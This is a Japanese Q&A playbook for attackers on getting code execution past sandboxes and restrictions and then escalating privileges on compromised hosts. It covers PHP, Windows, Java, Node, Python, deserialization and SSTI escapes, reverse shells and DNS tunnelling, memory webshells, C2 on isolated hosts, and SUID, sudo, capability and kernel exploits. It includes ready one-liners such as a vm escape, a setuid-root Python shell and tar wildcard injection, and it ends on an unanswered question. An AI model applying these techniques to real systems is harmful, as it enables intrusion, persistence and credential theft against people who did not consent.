# 権限昇格と足場 · コマンド実行が制限されたときの実行原語の選択

### 注入点を得たが、それが「コマンド実行」かまだ確定していない
**Q1**: 手元に制御可能な注入点(SQLi/SSTI/逆シリアル化/式)がある。果たしてコマンド実行まで到達できるのか?先に原語の「能級」をどう判定するか?
**A1**: 先に原語を等級分けし、慌てて whoami に走らない。弱い順に:ファイル読み取り < ファイル書き込み < 制限付き評価 < 任意コード実行(同一プロセスの言語層)< 任意コマンド実行(spawn で子プロセスを作れる)。判定基準は段階的な検知である:`/etc/passwd` を読める(読み取り)→ 制御可能なファイルを配置できる(書き込み)→ 帯域外 DNS/HTTP をトリガーできる(評価+ネットワーク)→ `id` の出力が取れる(コマンド)。最初から最上位を前提にせず、現在確証できた等級から計画を始める。
**Q2**: 「評価はできるが spawn で子プロセスが遮断される」と確証した。これは何を示すか?
**A2**: 言語層からシステム層への壁で止まっている。通常は disable_functions、runtime サンドボックス、seccomp、または spawn の hook が原因である。正しい心構えは `system()` を追い求めず、「同一プロセスの言語原語」で後続の動作をこなすことである。「コマンド実行」への執着を「自分は何を達成したいのか」に格下げする。
**Q3**: では、達成したい効果を具体的にどう分解するか?
**A3**: 3 種類の必須ニーズに分解する:認証情報の読み取り(ファイル/メモリ/環境変数)、横展開の接続(外向き接続の開始/ポート検知)、永続化(webshell/スケジュールタスクの配置)。それぞれに spawn に依存しない言語層の実装経路がある。今夜必要なのが「認証情報の読み取り」だけなら、spawn が遮断されても全く影響しない。
**Q4**: 「評価できる」ことすら確証できず、ブラインド注入点しかない場合はどうするか?
**A4**: 帯域外(OOB)で確認する:対象に DNS/HTTP リクエストを発させる payload を構築し、制御可能な受信端で評価の発生を確認する。帯域外は盲状態で最も信頼できる「原語の存在」の証拠であり、時間ブラインドより安定する。
**Q5**: 帯域外も通らない(外向きが全封鎖)。この経路が遮断されたらどこへ方向転換するか?
**A5**: 「内向きのディメンション」に方向転換する:外へ出られなければレスポンス内にチャネルを探す。時間ブラインド(sleep の差)、ブールブラインド(ページの差)、エラー出力(結果をエラーメッセージに埋める)。外向きが封じられても原語が存在しないわけではなく、原語を観測するチャネルが変わるだけである。「実行の確認」をネットワークチャネルから時間/内容チャネルへ直交転換する。
**Q6**: 原語の存在を確認したが非常に弱い(ブールブラインドしかできない)場合、続ける価値はあるか?
**A6**: ある。ただし戦術を替える。弱い原語は「正確な値の取得」に向き、「対話」には向かない。それで高価値ファイル(設定/秘密鍵/token)を 1 バイトずつ dump し、認証情報を得たら強いチャネル(SSH/DB 直結/クラウド API)に交代する。弱い原語の正しい使い方は「一度だけ鍵を盗む」ことであり、「shell として使う」ことではない。

### PHP で disable_functions が system/exec を全て禁止している
**Q1**: PHP コード実行はあるが、disable_functions が大量のコマンド関数を禁止している。残る札は何か?
**A1**: 推測せず列挙する。`get_defined_functions` を禁止リストと照合して、漏れた実行族を探す:`proc_open`/`popen`/`pcntl_exec`/`passthru`/`shell_exec`/`system` は 1〜2 個漏れていることが多い。`function_exists` で 1 つずつ検知し、どれかが生きていれば直接使う。
**Q2**: コマンド族が本当に全て禁止された場合、別の実行ディメンションはあるか?
**A2**: 「spawn 迂回」のディメンションに方向転換する:`LD_PRELOAD`+`mail()`/`error_log()` で子プロセスに悪意ある .so をロードさせる。`putenv`+`GCONV_PATH` で iconv を通る。FFI(PHP7.4+ で有効)で libc を直接呼ぶ。`imap_open` の歴史的注入。これらはリストにない。本質が「コマンド関数」ではないからである。
**Q3**: LD_PRELOAD の経路にはどんな前提が必要で、実行可能性をどう判断するか?
**A3**: 前提は 3 つである:ファイルを書ける(.so を置く)、子プロセスを fork する関数が 1 つは禁止されていない、`putenv` が禁止されていない。判定基準:書き込み可能な実行ディレクトリを確認し、`function_exists('putenv')` を確認し、トリガー点を見つける。どれか 1 つ欠けたら GCONV_PATH(fork に依存せず iconv トリガーに依存)に替える。
**Q4**: FFI が有効か不確かな場合、どう素早く判断するか?
**A4**: `class_exists('FFI')` かつ `ini_get('ffi.enable')` が disabled でないこと。有効なら核弾頭級である。`FFI::cdef` で `system` を宣言して呼べば、PHP 層の制限を全て迂回できる。これは disable_functions が全く防げないディメンションである。
**Q5**: 全ての native 迂回が失敗する(書き込み権限なし、FFI 無効、putenv 禁止)場合は諦めるか?
**A5**: 諦めない。「純粋な PHP の効果」のディメンションに直交転換する:ファイル読み取りは `file_get_contents`/ストリームラッパー。内部ネットワークへの接続は `fsockopen`/`stream_socket_client` で独自プロトコル。内部サービスの攻撃は SSRF 型のリクエスト。「shell を取る」のを諦め、PHP を攻撃クライアントとして直接使う。
**Q6**: 環境が PHP-FPM の場合、PHP 層をすっぱり迂回できるか?
**A6**: FPM 自体を攻めることを検討できる:9000 ポートか unix socket に触れられるなら、FastCGI プロトコルで `PHP_VALUE` を直接投げて `auto_prepend_file` を上書き/disable_functions を無効化する。「アプリ層の制限」を「プロトコル層の再設定」へ直交転換し、現在の worker の ini 制約を迂回する。

### Windows 上で cmd.exe / powershell.exe が指名で制限されている
**Q1**: プロセスを起動できる点はあるが、cmd.exe と powershell.exe が AppLocker/ソフトウェア制限ポリシーに遮られる。先に制約の境界をどう確認するか?
**A1**: 先にポリシーの種別を検知する:cmd を実行して「見つからない」か「ポリシーにブロックされた」かを見る(文言が違う)。AppLocker は既定で `%WINDIR%` 配下のマイクロソフト署名バイナリを許可し、ユーザー書き込み可能なディレクトリを遮る。先に「どのパス/どの署名が許可されるか」を確認してから原語を選ぶ。
**Q2**: cmd が遮られた場合、どうコマンドロジックを実行するか?
**A2**: LOLBins のディメンションに方向転換する:システム内蔵、マイクロソフト署名、通常はホワイトリスト内の `mshta`、`regsvr32`、`rundll32`、`wmic`、`msbuild`、`installutil`、`cscript/wscript`。これらは間接的にコードやスクリプトを実行でき、cmd/powershell への指名ブロックを迂回する。
**Q3**: PowerShell バイナリが遮られたが .NET 能力はまだ欲しい場合はどうするか?
**A3**: PowerShell は powershell.exe と同義ではない。同じ CLR をロードする別のホストに替える:`msbuild` のインラインタスク、`installutil` のアンロードフック、または自作の C# runspace ホスト。言語ランタイムはまだあり、指名されていない入口に替えただけである。
**Q4**: LOLBins もスクリプト規則に遮られる(.hta/.js すら実行不可)場合、この線が遮断されたらどこへ方向転換するか?
**A4**: 「信頼ディレクトリ/DLL ロード」のディメンションに直交転換する:AppLocker ホワイトリストディレクトリ内の書き込み可能なサブパスを探す(定番は `Tasks`、一部の `Temp` 例外)、または DLL サイドローディングで悪意ある DLL を受信プログラムの検索パスに置き、それを借りてロードさせる。実行権を「プロセス起動」から「プロセス内のモジュールロード」へ直交転換する。
**Q5**: 新プロセスが全く不要で、何かを読むだけでよい場合、より軽い原語はあるか?
**A5**: ある。多くの場面で必要なのはファイル/レジストリ/認証情報であり、現在動いていて信頼されているプロセスの能力を使えばよい(例:WMI 照会、レジストリ読み取り、SMB の ADMIN$ アクセス)。遮られたインタープリタには一切触れない。先に「自分は実行したいのか、データが欲しいのか」と問い、データが欲しいなら実行ポリシーに正面からぶつからない。

### PowerShell が制限言語モード(CLM)にある
**Q1**: PowerShell に入ったが `$ExecutionContext.SessionState.LanguageMode` が ConstrainedLanguage を示し、多くのものが呼べない。これは何を制限しているか?
**A1**: CLM が禁じるのは .NET 型呼び出し、Add-Type、リフレクションなど「任意コードへ逃れる」能力で、核心 cmdlet だけを許可する。判定基準:先にそれが CLM か、AppLocker 連動かを確認する(CLM は WDAC/AppLocker がトリガーすることが多い)。これが「言語モードを下げる」か「ホストを替える」かの迂回を決める。
**Q2**: 言語モードを FullLanguage に戻す直接の経路はあるか?
**A2**: 定番の考え方がいくつかある:CLM が `__PSLockdownPolicy` 環境変数でトリガーされ、私が環境変数を設定でき、新しい powershell を起動できるなら迂回できる。または CLM 制約を受けないホスト(自作 runspace、旧エンジン v2 があれば)を使う。先にトリガー源を確認し、原因に応じて対処する。
**Q3**: 環境変数を変更できず、v2 エンジンもない場合はどうするか?
**A3**: 「cmdlet の組み立て」のディメンションに方向転換する:CLM 下でも核心 cmdlet は使えるので、`Get-Content`/`Set-Content` でファイルを読み書きし、`Invoke-WebRequest` で外向き通信し、`Get-WmiObject` で照会できる。多くの目標(認証情報の読み取り、ダウンロード、内部リクエスト)は .NET リフレクション不要で、純粋な cmdlet だけで完了する。
**Q4**: 本当に shellcode 実行や API 呼び出しが必要で、純粋 cmdlet では足りない場合、この線が遮断されたらどこへ方向転換するか?
**A4**: 「PowerShell から完全に離れる」ディメンションに直交転換する:PS が CLM+ポリシーでロックされたなら、CLR ホスト(msbuild/installutil)、スクリプトエンジン(JScript/VBScript がロックされていなければ)、またはコンパイル済み .NET 実行体を作って配置実行する。PS の 1 本の木にぶら下がらない。実行原語の担い手は本来多様であるべきである。
**Q5**: ホストを替えても WDAC に全面的に遮られる(アプリ制御が非常に厳しい)場合はどうするか?
**A5**: 強い WDAC 環境であり、無理な迂回はコストが高いことを示す。戦略を転換する:本機の任意コードを追い求めず、「認証情報で横展開」に転換する。その場で認証情報/チケットを収集し、ポリシーがより緩いマシンで実行する。実行が制限されたとき、最適解は多くの場合、現在のマシンのポリシーを無理に攻略するのではなく、マシンを替えることである。

### 逆シリアル化 gadget がトリガーできるが出力がない
**Q1**: 逆シリアル化点が制御可能で使える gadget 連鎖があると確認したが、撃ってもページに変化がなく、成否が分からない。先にどうするか?
**A1**: 慌てて RCE 連鎖に進まず、先に「検知連鎖/帯域外連鎖」で実行の発生を確認する。DNS/HTTP 外連だけをトリガーする最小 gadget(または sleep させるもの)で連鎖が本当に走ったことを確認する。判定基準は帯域外でリクエストを受けるか、レスポンスが遅くなるかである。先に「連鎖が通る」ことを証明してから「結果を取る」ことを論じる。
**Q2**: 帯域外で連鎖が通ると確認したが、コマンド結果が欲しい。無出力を有出力にどう変えるか?
**A2**: 3 つの経路がある:帯域外転送(コマンド出力を DNS サブドメイン/HTTP パラメータに埋めて送る)、ファイルを web アクセス可能なパスに書いて後で読む、値を返せる gadget 変種で結果をレスポンスに戻す。どれを選ぶかは対象が外向き通信できるか、web 読み取り可能なディレクトリがあるかによる。
**Q3**: 対象が外向き通信できず、明らかな web 読み書き可能ディレクトリもない場合はどうするか?
**A3**: 「その場で webshell/メモリ馬を落とす」ディメンションに方向転換する:逆シリアル化は多くの言語で直接メモリ馬を注入できる(ファイルを置かない)。後続は特定の header/パラメータでトリガーして出力する。「一度きりの無出力 RCE」を「出力のある常駐チャネル」に昇格すれば、問題は結果取得から通常の対話に変わる。
**Q4**: gadget 連鎖がこのバージョン/依存で通らない(ClassNotFound など)場合、遮断されたらどこへ方向転換するか?
**A4**: 「gadget の供給源を替える」ディメンションに直交転換する:連鎖は対象の classpath に何があるかに依存する。先に依存を列挙し(エラー情報、jar のフィンガープリント、バージョン検知)、既存の依存に一致する別の連鎖に替える。または RCE を追わず、JDK ネイティブクラスだけの連鎖で JNDI/ファイル読み取り/SSRF などの弱いがより汎用的な効果を狙う。連鎖の選択の本質は「対象の依存リストへの一致」である。
**Q5**: 使える連鎖すら見つからない(依存がきれいすぎる)場合はどうするか?
**A5**: 目標を格下げする:逆シリアル化は RCE できなくても、DoS、SSRF、ファイル読み書き検知、JNDI 注入による二次利用をトリガーできることが多い。「この点は必ず RCE できる」という期待を下ろし、それを「内部ネットワーク検知/二次注入」の踏み台として使えば、価値は残る。

### SSTI が制限付きサンドボックステンプレートエンジンに落ちた
**Q1**: SSTI(Jinja2/Freemarker 系)と確認したが、エンジンがサンドボックスを有効にし、通常の payload が SecurityError を返す。先に何を判断するか?
**A1**: 先に「サンドボックスがどの層を遮るか」を判断する:属性アクセス(`__class__`/`__globals__`)を遮るのか、特定の内蔵を遮るのか、呼び出し自体を遮るのか。判定基準はどの段階でエラーになるかを 1 つずつ検知することである。オブジェクトにアクセスできるか、属性を取れるか、呼び出せるか。具体的な壁を特定して初めて迂回の方向が定まる。
**Q2**: 属性走査(MRO を登って利用可能なクラスを探す)という定番の経路がサンドボックスに固く監視されている場合はどうするか?
**A2**: 「属性フィルタの迂回」のディメンションに方向転換する:attr フィルタ/getattr の等価物を使う、`|attr('__cl'+'ass__')` でキーワードのブラックリストを文字列連結で迂回する、リクエストコンテキストに既に露出しているオブジェクト(config、request、self)を踏み台にする。サンドボックスは少数の文字列だけをブラックリストにすることが多く、文字列層の難読化は通ることが多い。
**Q3**: サンドボックスが進化し、連結もフィルタも塞がれた場合、遮断されてどこへ方向転換するか?
**A3**: 「RCE を追わず、情報だけを取る」ディメンションに直交転換する:SSTI はサンドボックス化されても、通常はテンプレートコンテキスト内の機微オブジェクト(設定、鍵、session 鍵、DB 接続文字列)を読める。secret key を得れば署名/session を偽造できるかもしれず、効果は RCE に劣らない。目標を「コマンド実行」から「コンテキスト機密の漏えい」に転換する。
**Q4**: コンテキストにも価値のあるオブジェクトがない場合はどうするか?
**A4**: 「エンジンの特性」のディメンションに方向転換する:エンジンごとに固有のエスケープ面がある(Freemarker の `new`/`Execute`、Velocity のクラスロード、Twig の filter 登録)。先にエンジンとバージョンを正確にフィンガープリントし、そのエンジンの既知のサンドボックスエスケープ面で攻める。汎用 payload を流用しない。フィンガープリントを誤ると、全ての payload が無駄になる。
**Q5**: エンジンのサンドボックスに既知のエスケープが本当にない(パッチが非常に新しい)場合はどうするか?
**A5**: 「式層のてこ」に格下げする:計算できる、文字列を組み立てられる、エンジンを外部リソースへのリクエストに誘導できる、これらだけで SSRF、ブラインド注入の増幅、他の機微テンプレートのレンダリング読み取りができることが多い。この点で RCE が取れないと認め、それを「制限付きだが使える評価原語」として全体連鎖に組み込む。エスケープに固執しない。

### Java アプリが SecurityManager やクラスロード制限を導入している
**Q1**: Java コード実行を確認したが、`Runtime.exec` を呼ぶと AccessControlException が発生する。SecurityManager が監視していることを示す。先にどう特定するか?
**A1**: 先にその policy の境界を読む:どの permission が付与され、どれが拒否されるか。判定基準は操作を 1 つずつ試すことである。`System.getProperty`/`FilePermission` で読み取り検知ディレクトリを調べ、`SocketPermission` で接続性を試す。permission 表 1 枚が、どの原語がまだ生きているかを教えてくれる。推測しない。
**Q2**: exec は禁止だがリフレクションは使える場合、迂回できるか?
**A2**: 定番の考え方はリフレクションで SM を無効化することである:`System.setSecurityManager(null)` は `setSecurityManager` 権限が拒否されていなければ直接外せる。またはリフレクションで `Policy` シングルトンを変更する。判定基準はこの 2 つの動作が例外を投げるかで、どちらか 1 つが生きていれば一歩で完了する。
**Q3**: リフレクションも policy に固く遮られる場合はどうするか?
**A3**: 「JVM 層を迂回する」ディメンションに方向転換する:JNI/カスタム ClassLoader で信頼 jar をロードする、`ProcessBuilder` のリフレクション変種、または業務コード内の既に認可された privileged ブロックを踏み台にする(`AccessController.doPrivileged` ブロック内のコードは呼び出し元の権限制約を受けない)。privileged の穴を探す方が policy を正面から攻めるより安上がりである。
**Q4**: privileged の隙間が 1 つも見つからない場合、遮断されたらどこへ方向転換するか?
**A4**: 「exec しなくても達成する」ディメンションに直交転換する:Java ではファイル読み取り、内部ネットワーク接続、SQL 実行、HTTP 送信は exec を必要としない。目的が横展開や認証情報の読み取りなら、JDBC/HttpClient/NIO で直接完了する。SM が主に遮るのはコマンド実行と機微 IO であり、業務層のネットワークは通常開いている。
**Q5**: 本機でバイナリ(mimikatz 系など)を実行する必要が本当にある場合はどうするか?
**A5**: 戦場を替える:本機でバイナリを実行するという執着はしばしば間違いである。認証情報系のニーズを「Java 内 API で取る」に転換する。JDBC 接続文字列内の平文パスワード、session キャッシュ、Spring 環境変数。本当に本機ツールを実行する必要があるなら、SM 制約のあるプロセス内でやるべきではない。ポリシーの緩いマシンへ横展開する。

### Node.js で eval を得たが vm サンドボックスや permission model に閉じ込められている
**Q1**: Node アプリ内で `eval`/`Function` 評価を得たが、コードが `vm.runInContext` で動き、`process`/`require` が取れない。先に何を判断するか?
**A1**: 「サンドボックスのモデル」を判断する:vm モジュールのサンドボックスはプロトタイプチェーンを隔離しない。定番のエスケープは `this.constructor.constructor('return process')()` でメインコンテキストへ登ることである。先に `this` が何か、コンストラクタチェーンが通るかを検知する。判定基準は `process` を取れるかである。
**Q2**: `process` を取れれば即 RCE か?
**A2**: ほぼそうである。`process.mainModule.require('child_process').exec` で一歩 spawn できる。ただし Node 20+ の `--experimental-permission` に注意する:process を取っても、spawn/fs が permission model に遮られる可能性がある。判定基準は無害な `child_process.exec('id')` を先に走らせて ERR_ACCESS_DENIED が出るかを見ることである。
**Q3**: permission model が child_process と fs を遮った場合、この線が遮断されたらどこへ方向転換するか?
**A3**: 「純粋な JS の効果」のディメンションに直交転換する:Node 内蔵の http/https/net/dns は通常まだ開いているので、独自プロトコルで内部ネットワークに接続し、リクエストを送り、DNS で持ち出せる。評価原語はまだあり、spawn と fs が切られただけである。Node を shell のホストではなく攻撃クライアントとして使う。
**Q4**: webshell を落として永続化したいが、fs が制限されている場合はどうするか?
**A4**: process.env とメモリのディメンションに方向転換する:payload をロード済みモジュールのエクスポートオブジェクトに掛ける(ミドルウェアを monkey-patch する)。トリガー経路はリクエストパラメータで制御する。メモリ馬と等価で、ディスクに書かずに fs 権限を迂回できる。前提は require キャッシュに登れることである。
**Q5**: `this.constructor.constructor` すら取れない(vm2/isolated-vm 系)場合はどうするか?
**A5**: 期待を格下げする:isolated-vm は真の隔離であり、無理にぶつからない。評価点を「情報の抽出器」として使う。計算できる、文字列を組み立てられる、結果を返せる、これでサンドボックスに注入されたコンテキストオブジェクト(業務が渡す user、config、db handle)を dump できる。「サンドボックスから逃げる」を「サンドボックス内の露出オブジェクトを洗いざらい奪う」に直交転換する。

### Python eval で builtins が空にされている
**Q1**: Python で式を入れられるが、`__builtins__` が空 dict に置換され、`open`/`exec`/`__import__` が全てない。先にどうするか?
**A1**: 先に本当に空か、単に隠されているかを確認する。Python では builtins はオブジェクト経由で登り返せる:任意オブジェクトの `.__class__.__mro__[-1].__subclasses__()` を走査して `warnings.catch_warnings` などに到達し、その `__globals__` から builtins を取り戻す。判定基準は None でないオブジェクトを 1 つ取れるかである。
**Q2**: 式モードでは文を使えない場合はどうするか?
**A2**: eval は式しか受け付けず、`import`/`for` は使えない。しかしリスト内包表記、ジェネレータ、代入式(walrus)は式である。呼び出し形式の `__import__` は登り返した builtins から取る。論理的には式と文は等価で、構文が締められているだけである。
**Q3**: オブジェクト登り経路が AST 検査器(`__` キーワードのブラックリスト)に遮られた場合はどうするか?
**A3**: 「文字列構築」のディメンションに方向転換する:`__class__` は `"_"*2+"class"+"_"*2` で組み立てられる。`getattr` は hex/oct 式で迂回できる。または `vars()`/`globals()`(禁止されていなければ)で直接 dunder を飛ばす。AST 層のフィルタで文字列定数を検査するのは難しく、通常は token 層のブラックリストなので、文字列連結で迂回できる。
**Q4**: AST ホワイトリストモード(算術のみ許可)で何も組み立てられない場合、この線が遮断されたらどこへ方向転換するか?
**A4**: 「コンテキスト変数の読み取り」のディメンションに直交転換する:AST ホワイトリストは識別子参照を許可することが多い。業務が渡す変数(request、user、db)自体が完全なオブジェクトなので、直接参照すれば dunder は不要である。「サンドボックスから逃げる」を「サンドボックス内に既に注入されたオブジェクトを利用する」に転換する。
**Q5**: コンテキストもきれいな場合はどうするか?
**A5**: これは極めて制限された評価原語だと認め、それを「計算のてこ」として使う:ブラインド注入の位置特定を補助し、文字列検索を増幅し、暗号のオフセットを計算する。全ての eval が RCE できるとは期待しない。弱い原語は連鎖の中間の 1 環として存在することが多く、終点ではない。

### リバース shell がどうしても張れない
**Q1**: 信頼できる RCE があるのに、bash/nc/curl の反対接続が全てタイムアウトする。これは何を示すか?
**A1**: 外向き通信が制限されている(ファイアウォールの外向きポリシー)か、ドメイン/プロトコルが検閲されている。先に層別に原因を探る:ICMP が通るか。TCP の常用ポート(80/443/53)が通るか。UDP 53 が通るか。これがどのチャネルを使うかを決める。
**Q2**: TCP 80/443 は通るが nc リバースが失敗する場合はどうするか?
**A2**: HTTP 強制プロキシ/ディープパケット検知の可能性がある。「HTTP らしく見える」チャネルに替える:リバース payload を curl のロングポーリング自作にするか、websocket を使う。プロトコル偽装は大半の L7 外向き検知を通過できる。
**Q3**: DNS の外向きしかない場合はどうするか?
**A3**: DNS チャネルに方向転換する:iodine/dnscat2 系の考え方で DNS トンネルを構築する。欠点は遅いことだが、対話 shell には十分である。前提はドメインの権威 NS を制御できることである。DNS は検閲が最も緩いチャネルの 1 つである。
**Q4**: 逆方向接続が全く通らず、外向きの pull 型(能動的にリクエストできる)しかない場合、遮断されたらどこへ方向転換するか?
**A4**: 「webshell/正方向ポーリング」のディメンションに直交転換する:リバースをやめ、対象マシンに「ポーリングで命令を取る」最小クライアントを走らせ、N 秒ごとに私の HTTP を pull させる。または webshell 対話モードに留まり、対話型 shell を追わない。リバースは形式にすぎず、命令の配信こそが目的である。
**Q5**: 外向き pull すら遮られる(完全な孤島)場合はどうするか?
**A5**: 「内向きチャネル」のディメンションに方向転換する:対象に外向きサービス(私が外からアクセスして入ったもの)があれば、それを C2 に使う。webshell を業務 API に隠し、命令を HTTP リクエストパラメータで配信する。孤島マシンの正しい C2 は「それが外部に露出するサービスを通す」ことであり、自ら外へ出ることではない。

### shell を得たが対話型 tty ではない
**Q1**: リバースしてきた dumb shell で、コマンドは打てるが履歴も tab もなく、`sudo`/`ssh`/`vi` が全て壊れる。tty を昇格すべきか?
**A1**: 必須かを判断する。一度きりのファイル取得/スケジュールタスク追加には tty は不要で、無理に昇格するとかえって露出する。対話的な sudo 権限昇格、tmux 実行、設定編集をするなら昇格する。判定基準は「次の動作が端末セマンティクスに依存するか」である。
**Q2**: 昇格すると決めた場合、Linux の標準三板斧は何か?
**A2**: `python -c 'import pty; pty.spawn("/bin/bash")'`、`script -qc /bin/bash /dev/null`、または `stty raw -echo; fg`(ローカル nc 側)の併用。3 つから 1 つを対象の利用可能性で選ぶ。スクリプト言語があるマシンなら pty 法を優先する。
**Q3**: 対象に python も script もない場合はどうするか?
**A3**: socat に方向転換する:`socat file:$(tty),raw,echo=0 tcp-listen:...` + 対象側 `socat exec:'bash -li',pty,stderr...`。socat バイナリは多くのイメージに入っている。なければ先に wget/curl で静的コンパイル版を引っ張る(ファイルを書ければ)。
**Q4**: tty を昇格したが `stty` のサイズが乱れ、Ctrl-C で切断される場合、遮断されたらどこへ方向転換するか?
**A4**: 「ローカル tty を追わない」ディメンションに直交転換する:SSH を張る。現在の shell で鍵を生成し、対象の `authorized_keys` に追加する(書ければ)。私が SSH で逆接続するチャネルはネイティブ tty である。以後の対話は全て SSH を通し、リバース shell は「導入の踏み台」としてだけ使う。
**Q5**: SSH ポートが開いておらず、開けない場合はどうするか?
**A5**: tmux/screen を落とすことに方向転換する:バックグラウンド tmux セッションを起動し、リバース shell を `tmux attach` で入る。生まれつき完全な端末セマンティクスを持つ。または web 端末 shell(wetty/gotty)を対象ローカルで HTTP 端末として起動し、トンネル経由でアクセスする。

### Linux で SUID バイナリを列挙した後、どう選ぶか
**Q1**: `find / -perm -4000` で SUID バイナリが大量に出た。どれから見るか?
**A1**: 3 層に分けて並べる:1 つは GTFOBins がカバーする定番(`find`/`vim`/`less`/`python`/`nmap` 旧版)。直接表を引いて当てはめる。2 つ目は非標準/自作 SUID(業務ベンダーの私物)。リバースするか、文字列からコマンド連結を探す。3 つ目はバージョンが古いシステムコンポーネント(`pkexec`/`sudo`/`chfn` などの CVE 常連)。CVE 表を引く。
**Q2**: GTFOBins に一致がなく、自作 SUID の場合、どう手を付けるか?
**A2**: 先に strings + ltrace で外部コマンドを呼ぶかを見る。文字列を連結して `system("cp ...")` を走らせるなら、PATH ハイジャックか引数注入が成立する。絶対パスで呼ぶなら、環境変数(`LD_PRELOAD` が消えていなければ、`IFS` の区切り)や引数解析の脆弱性で影響できるかを見る。
**Q3**: バイナリが PATH と環境を消し、絶対パスも使う場合はどうするか?
**A3**: 「読み取り/書き込みの SUID」のディメンションに方向転換する:全ての SUID が shell を取る必要はない。root で任意ファイルを読める SUID(カスタムログリーダーなど)だけで `/etc/shadow`/秘密鍵を dump できる。任意ファイルを書ける SUID なら `/etc/passwd` を変更/ sudoers を書ける。目標を「権限昇格」から「値の取得」に格下げする。
**Q4**: 全て試して突破できない場合、遮断されたらどこへ方向転換するか?
**A4**: 「非 SUID の権限昇格面」のディメンションに直交転換する:capability(`getcap -r /`)、sudo -l、cron の書き込み可能スクリプト、PATH に書き込む root サービス、カーネル exp、グループ権限(docker/lxd/disk グループは root に直通)。SUID は権限昇格面のごく一部であり、行き詰まったらマトリクス全体を完全に列挙すべきである。
**Q5**: 完全なマトリクスを回しても解がない場合はどうするか?
**A5**: 本機の権限昇格経路が目立たないと認め、横展開に方向転換する:現在のユーザーが触れられる認証情報(`.bash_history`、秘密鍵、config 内のパスワード、ブラウザストレージ)を取得して別のマシンを試す。または低権限のままタスクを完了できる(業務データを読む、踏み台にする)。「root 必須」を必須ニーズにしない。

### sudo -l に項目があるが NOPASSWD が厳しく限定されている
**Q1**: `sudo -l` が root で特定の数コマンドを実行できると示すが、引数が制限されている。先に何を見るか?
**A1**: 2 点を見る:コマンドが GTFOBins に sudo エスケープ項目を持つか(`awk`/`less`/`man`/`vi` は直接 shell を内蔵する)。引数にワイルドカードがあるか(`sudo /path/prog *` 系。引数を連結できる)。前者は一歩で完了し、後者は最も定番の設定ミスである。
**Q2**: ワイルドカード設定ミス(例 `sudo tar *`)の場合、どう利用するか?
**A2**: tar の `--checkpoint-action=exec=` 系の特性、rsync の `-e`、find の `-exec` を使う。原理はプログラムに、ある引数を「実行動作」として解釈させることである。引数の形の名前のファイル(`--checkpoint-action=...`)をカレントディレクトリに作れば、ワイルドカード展開時に注入される。
**Q3**: 引数が完全に固定で、特定コマンド+特定引数しか実行できない場合はどうするか?
**A3**: 「コマンド自体の副作用」のディメンションに方向転換する:引数が固定でも、コマンドがエディタ/ビューア/圧縮ツールなら、内部に shell エスケープがあることが多い。またはコマンドが自作スクリプトなら、その内容を読んで二次注入点(何を呼ぶか、引数をどう渡すか)を探す。
**Q4**: コマンドが root 権限で動くカスタムスクリプトで、私が制御できない設定を読む場合、遮断されたらどこへ方向転換するか?
**A4**: 「ファイルのタイミング」のディメンションに直交転換する:スクリプトが読む設定/ログ/一時ファイルが私に書き込めるか、読む前に短い窓があるかを見る。TOCTOU、シンボリックリンク置換、競合状態はこの種の場面の定番の突破口である。sudo コマンドが固定されたとき、攻撃面はそれが依存するファイルシステム状態に移る。
**Q5**: 依存ファイルも全て root 所有で、競合もない場合はどうするか?
**A5**: 用途を格下げする:権限昇格できなくても、NOPASSWD コマンド自体が情報原語である。root でファイルを読めるなら(例 `sudo cat /var/log/xxx`)、ログ内の認証情報を得て横展開に十分である。sudo 項目を権限昇格の踏み台ではなく「root 視点の情報リーダー」として扱う。

### Linux capability 認可を列挙した後の使い方
**Q1**: `getcap -r /` で、非標準 SUID だが capability を持つバイナリがいくつか見つかった。先に何を見るか?
**A1**: 能力で分類する:`cap_setuid` は uid 設定を許可(ほぼ SUID と等価)。`cap_dac_read_search`/`cap_dac_override` は任意ファイルの読み取り/書き込みを直接可能にする。`cap_sys_admin` は万能。`cap_net_raw` は sniff/spoof 可能。`cap_sys_ptrace` は任意プロセスへの attach 可能。それぞれ利用経路が異なる。
**Q2**: `cap_setuid+ep` が python/perl/ruby に付いている場合はどうするか?
**A2**: 直接一歩で root になる:`python -c 'import os;os.setuid(0);os.system("/bin/bash")'`。能力がインタープリタに付くことは、インタープリタを SUID に変えるのと等価で、定番の SUID より柔軟である。
**Q3**: `cap_dac_read_search` が `tar`/`cp` に付いていて、読み取りしかできない場合はどうするか?
**A3**: それで `/etc/shadow`、他ユーザーの秘密鍵、`/root/.ssh/*` を dump する。hash か鍵を得たら別の経路(オフライン爆破/SSH)に進む。読み取り原語は直接の権限昇格はできないが、「別の身元の認証情報」に変換でき、同等の効果になる。
**Q4**: `cap_sys_ptrace` の場合、どう使うか?
**A4**: root プロセスに attach してコードを注入する。長期間動く root プロセス(systemd サービスなど)を 1 つ探し、gdb/自作の ptrace クライアントで `execve` を呼ぶか shellcode を注入する。判定基準は attach できるか(PTRACE_ATTACH の返り値)である。
**Q5**: 全て弱い能力(`cap_net_bind_service` など)で、権限昇格できない場合、遮断されたらどこへ方向転換するか?
**A5**: 「能力が横展開/永続化を補助する」ディメンションに直交転換する:`cap_net_raw` は内部ネットワークの平文トラフィックを sniff して認証情報を取れる。`cap_net_bind_service` は低ポートをバインドして偽サービスで認証情報を釣れる。弱い能力を偵察/フィッシングの原語として使い、権限昇格を無理に追わない。

### いつカーネル exp に踏み切れるか
**Q1**: ユーザーモードの権限昇格経路を全て試して突破できず、カーネルバージョンに既知の exp があるように見える。撃つべきか?
**A1**: 3 つの敷居がある:1 つは環境がクラッシュに耐えられるか(本番/共用/HIDS は厳禁)。2 つ目は exp がそのディストリビューション向けにコンパイルされた正確なバージョンか(カーネル exp はバージョン敏感)。3 つ目は戻り計画があるか(クラッシュしたらどうするか)。3 点が揃ってから動き、そうでなければ先に別の経路を貯める。
**Q2**: 環境が許す場合、どう exp を選ぶか?
**A2**: 「データ構造系」と「ロジック脆弱性系」を優先する(Dirty Pipe、Dirty Cow、OverlayFS 権限昇格、nf_tables 系)。成功率が高く影響範囲が狭い。SLUB/UAF 系の全滅 exp は避ける(クラッシュしやすく、正確な offset が必要)。判定基準は exp README の安定性の記述と対応カーネルバージョンである。
**Q3**: コンパイル環境が一致しない(対象に gcc がない)場合はどうするか?
**A3**: 攻撃マシンで musl-cross/静的コンパイルで対応アーキテクチャ版を作り、配置して実行する。またはコンパイル済み blob を探す(バージョンが合えば使う)。対象マシンに gcc を入れるのは避ける。うるさすぎる。
**Q4**: 1 回撃って権限昇格もクラッシュもしなかった場合、どう状態を判断するか?
